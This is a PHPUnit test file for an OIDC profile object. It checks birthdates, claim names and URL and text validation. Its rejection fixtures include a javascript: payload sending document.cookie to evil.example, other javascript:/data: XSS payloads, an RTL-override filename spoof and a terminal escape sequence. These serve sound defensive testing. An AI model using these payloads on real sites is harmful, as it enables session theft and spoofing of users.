<?php

declare(strict_types=1);

namespace Beffroi\Core\Tests\Domain\Identity;

use Beffroi\Core\Domain\Identity\Profile;
use Beffroi\Core\Exception\InvalidArgumentException;
use function array_keys;
use function in_array;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\Attributes\Test;
use PHPUnit\Framework\TestCase;
use function sprintf;
use function str_repeat;

final class ProfileTest extends TestCase
{
    /**
     * OIDC Core §5.1
     */
    #[Test]
    #[DataProvider('provideValidBirthdates')]
    public function itAcceptsTheBirthdateFormsOfOidcCore(string $birthdate): void
    {
        // When / Then
        static::assertSame($birthdate, new Profile(birthdate: $birthdate)->birthdate);
    }

    /**
     * @return iterable<string, array{string}>
     */
    public static function provideValidBirthdates(): iterable
    {
        yield 'full date' => ['1990-05-21'];
        yield 'year only' => ['1990'];
        yield 'unknown year' => ['0000'];
        yield 'the 29th of February of a leap year' => ['2024-02-29'];
        yield 'a day whose year is withheld' => ['0000-05-21'];
        yield 'the 29th of February of a year withheld' => ['0000-02-29'];
    }

    #[Test]
    public function readingItInAnotherLanguageReplacesThatClaimAlone(): void
    {
        // Given
        $profile = new Profile(name: 'Alice Lovelace', givenName: 'Alice', zoneinfo: 'Europe/London', locale: 'en-GB');

        // When
        $read = $profile->readIn('fr');

        // Then
        static::assertSame('fr', $read->locale);
        static::assertSame('Alice Lovelace', $read->name);
        static::assertSame('Alice', $read->givenName);
        static::assertSame('Europe/London', $read->zoneinfo);
    }

    #[Test]
    public function aProfileIsNotReadInNoLanguage(): void
    {
        // Then
        $this->expectException(InvalidArgumentException::class);
        $this->expectExceptionMessageIs('The language a profile is read in is either absent or non-empty.');

        // When
        Profile::empty()->readIn('');
    }

    #[Test]
    public function anEmptyProfileHasNoBirthdate(): void
    {
        // When / Then
        static::assertNull(Profile::empty()->birthdate);
    }

    #[Test]
    #[DataProvider('provideInvalidBirthdates')]
    public function itRejectsAnotherBirthdateFormat(string $birthdate): void
    {
        // Then
        $this->expectException(InvalidArgumentException::class);

        // When
        new Profile(birthdate: $birthdate);
    }

    /**
     * @return iterable<string, array{string}>
     */
    public static function provideInvalidBirthdates(): iterable
    {
        yield 'day first' => ['21/05/1990'];
        yield 'trailing characters' => ['1990-05-21T00:00'];
        yield 'leading characters' => ['born 1990'];
        yield 'leading characters before a date' => ['born 1990-05-21'];
        yield 'a line feed behind a birthdate that would pass' => ["1990-05-21\n"];
        yield 'a line feed behind a year that would pass' => ["1990\n"];
    }

    /**
     * OIDC Core §5.1
     */
    #[Test]
    #[DataProvider('provideDatesThatAreNoDay')]
    public function itRejectsADateThatIsNoDayOfTheCalendar(string $birthdate): void
    {
        // Then
        $this->expectException(InvalidArgumentException::class);
        $this->expectExceptionMessageIs(sprintf(
            'The birthdate "%s" must be a day of the calendar, "YYYY-MM-DD", or a year alone, "YYYY", the year "0000" when it is withheld.',
            $birthdate,
        ));

        // When
        new Profile(birthdate: $birthdate);
    }

    /**
     * @return iterable<string, array{string}>
     */
    public static function provideDatesThatAreNoDay(): iterable
    {
        yield 'a thirteenth month and a forty-fifth day' => ['2024-13-45'];
        yield 'a month zero' => ['2024-00-10'];
        yield 'a day zero' => ['2024-05-00'];
        yield 'the 31st of a month of thirty days' => ['2024-04-31'];
        yield 'the 29th of February of a common year' => ['2023-02-29'];
        yield 'the 30th of February of a year withheld' => ['0000-02-30'];
    }

    /**
     * @param array<string, string> $document
     */
    #[Test]
    #[DataProvider('provideDocuments')]
    public function itWritesTheDocumentAColumnHoldsItAs(Profile $profile, array $document): void
    {
        // When / Then
        static::assertSame($document, $profile->toDocument());
    }

    /**
     * @param array<string, string> $document
     */
    #[Test]
    #[DataProvider('provideDocuments')]
    public function itComesBackOutOfItsDocument(Profile $profile, array $document): void
    {
        // When / Then
        static::assertEquals($profile, Profile::fromDocument($document));
    }

    /**
     * @return iterable<string, array{Profile, array<string, string>}>
     */
    public static function provideDocuments(): iterable
    {
        yield 'a profile' => [
            new Profile(givenName: 'Alice', familyName: 'Durand', birthdate: '1990-05-21', locale: 'fr-FR'),
            [
                'givenName' => 'Alice',
                'familyName' => 'Durand',
                'birthdate' => '1990-05-21',
                'locale' => 'fr-FR',
            ],
        ];
        yield 'a profile that says nothing' => [Profile::empty(), []];
    }

    /**
     * @param array<array-key, mixed> $document
     */
    #[Test]
    #[DataProvider('provideDocumentsThatAreNotAProfile')]
    public function aDocumentThatIsNotAProfileIsRefused(array $document, string $message): void
    {
        // Then
        $this->expectException(InvalidArgumentException::class);
        $this->expectExceptionMessageIsOrContains($message);

        // When
        Profile::fromDocument($document);
    }

    /**
     * @return iterable<string, array{array<array-key, mixed>, string}>
     */
    public static function provideDocumentsThatAreNotAProfile(): iterable
    {
        yield 'a claim that is not a string' => [
            [
                'nickname' => 12,
            ],
            'A profile is a document of claims named by the fields that hold them, each a string.',
        ];
        yield 'a claim that is a list' => [['Alice'], 'A profile is a document of claims named by the fields that hold them, each a string.'];
        yield 'a name no field holds' => [
            [
                'email' => 'alice@example.com',
            ],
            'Unknown named parameter $email',
        ];
        yield 'a website the object refuses' => [
            [
                'websiteUrl' => 'javascript:alert(1)',
            ],
            'The website "javascript:alert(1)" must be an absolute https or http URL (OIDC Core section 5.1).',
        ];
        yield 'a birthdate the object refuses' => [
            [
                'birthdate' => '21/05/1990',
            ],
            'The birthdate "21/05/1990" must be a day of the calendar, "YYYY-MM-DD", or a year alone, "YYYY"',
        ];
    }

    /**
     * OIDC Core §5.1
     */
    #[Test]
    public function itSaysEachClaimUnderItsNameInTheSpecification(): void
    {
        // Given
        $profile = new Profile(givenName: 'Ada', profileUrl: 'https://ada.example/about');

        // When
        $claims = $profile->claims();

        // Then
        static::assertSame('Ada', $claims['given_name']);
        static::assertSame('https://ada.example/about', $claims['profile']);
        static::assertNull($claims['nickname']);
    }

    #[Test]
    #[DataProvider('provideClaimNames')]
    public function aClaimSaidByItsNameIsReadBackUnderIt(string $claim, string $value): void
    {
        // When
        $said = Profile::empty()->describedWith([
            $claim => $value,
        ]);

        // Then
        static::assertSame($value, $said->claims()[$claim]);
    }

    /**
     * @return iterable<string, array{string, string}>
     */
    public static function provideClaimNames(): iterable
    {
        foreach (array_keys(Profile::empty()->claims()) as $claim) {
            yield $claim => [$claim, in_array($claim, ['profile', 'picture', 'website'], true) ? 'https://2001.example/' : '2001'];
        }
    }

    /**
     * OIDC Core §5.1
     */
    #[Test]
    #[DataProvider('provideWebAddresses')]
    public function aUrlClaimHoldsAnAbsoluteWebAddress(string $claim, string $url): void
    {
        // When
        $said = Profile::empty()->describedWith([
            $claim => $url,
        ]);

        // Then
        static::assertSame($url, $said->claims()[$claim]);
    }

    /**
     * @return iterable<string, array{string, string}>
     */
    public static function provideWebAddresses(): iterable
    {
        yield 'a profile page over https' => ['profile', 'https://social.example/ada'];
        yield 'a picture over http' => ['picture', 'http://images.example/ada.png?size=64'];
        yield 'a website on a port' => ['website', 'https://ada.example:8443/'];
        yield 'a website whose scheme is in capitals' => ['website', 'HTTPS://ada.example'];
        yield 'a website on an IPv6 address' => ['website', 'https://[2001:db8::1]/'];
    }

    /**
     * OIDC Core §5.1
     */
    #[Test]
    #[DataProvider('provideAddressesThatAreNoWebPage')]
    public function aUrlClaimRefusesWhatIsNoAbsoluteWebAddress(string $claim, string $url): void
    {
        // Then
        $this->expectException(InvalidArgumentException::class);
        $this->expectExceptionMessageIs(sprintf('The %s "%s" must be an absolute https or http URL (OIDC Core section 5.1).', $claim, $url));

        // When
        Profile::empty()->describedWith([
            $claim => $url,
        ]);
    }

    /**
     * @return iterable<string, array{string, string}>
     */
    public static function provideAddressesThatAreNoWebPage(): iterable
    {
        yield 'a script as the website' => ['website', 'javascript:fetch(`//evil.example/?c=`+document.cookie)'];
        yield 'a script as the profile page' => ['profile', 'javascript:alert(1)'];
        yield 'a script as the picture' => ['picture', 'javascript:alert(1)'];
        yield 'a document carried in the URL' => ['profile', 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='];
        yield 'an image carried in the URL' => ['picture', 'data:image/svg+xml,<svg onload=alert(1)>'];
        yield 'a script in capitals' => ['website', 'JavaScript:alert(1)'];
        yield 'a script behind a space' => ['website', ' javascript:alert(1)'];
        yield 'a script whose scheme a tab splits' => ['website', "java\tscript:alert(1)"];
        yield 'a web scheme with no host' => ['website', 'https:javascript:alert(1)'];
        yield 'a web scheme with an empty host' => ['website', 'https:///ada'];
        yield 'a relative reference' => ['website', '/ada'];
        yield 'a host with no scheme' => ['website', 'ada.example'];
        yield 'another scheme' => ['website', 'ftp://ada.example/'];
        yield 'a line feed behind an address that would pass' => ['website', "https://ada.example\n"];
    }

    #[Test]
    public function itSaysThirteenClaims(): void
    {
        // When / Then
        static::assertCount(13, Profile::empty()->claims());
    }

    /**
     * OIDC Core §5.1
     */
    #[Test]
    #[DataProvider('provideTextClaimsThatAreNotPlain')]
    public function aClaimOfTextThatIsNotPlainIsRefused(string $claim, string $value, string $message): void
    {
        // Then
        $this->expectException(InvalidArgumentException::class);
        $this->expectExceptionMessageIs($message);

        // When
        Profile::empty()->describedWith([
            $claim => $value,
        ]);
    }

    /**
     * @return iterable<string, array{string, string, string}>
     */
    public static function provideTextClaimsThatAreNotPlain(): iterable
    {
        yield 'a name of two million characters' => [
            'name',
            str_repeat('a', 2_000_000),
            'The name must be plain text of at most 255 characters, with no control, format or line separator character.',
        ];
        yield 'a nickname that overrides the direction of the line' => [
            'nickname',
            "Alice\u{202E}gnp.exe",
            'The nickname must be plain text of at most 255 characters, with no control, format or line separator character.',
        ];
        yield 'a given name with an escape sequence' => [
            'given_name',
            "Ada\e[31m",
            'The given_name must be plain text of at most 255 characters, with no control, format or line separator character.',
        ];
        yield 'a locale on two lines' => [
            'locale',
            "fr\nen",
            'The locale must be plain text of at most 255 characters, with no control, format or line separator character.',
        ];
        yield 'a website longer than an address is' => [
            'website',
            'https://rp.example/' . str_repeat('a', 2048),
            'The website must be at most 2048 characters long.',
        ];
    }
}
